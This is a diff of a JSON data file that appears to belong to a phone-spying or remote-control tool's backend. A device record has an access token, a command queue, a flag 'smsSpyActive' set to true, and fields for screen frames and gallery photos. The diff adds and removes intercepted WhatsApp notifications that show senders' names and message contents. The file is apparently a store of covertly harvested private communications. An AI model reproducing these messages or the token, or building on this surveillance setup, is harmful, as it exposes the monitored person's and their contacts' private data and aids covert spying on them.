@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959384702,
+    "lastSeen": 1776959389125,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959385536
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959385517
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951754334
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Oi: BEW STORE",
-        "content": "乂  W A R N I N G \n\nYou got +1 warning point : [ 1 / 5 ]\n\n> If you get 5 warning points you will be removed from this group.\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951753813
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎72 pesan dari 42 chat",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951753777
       }
     ],
     "galleryPhotos": [],
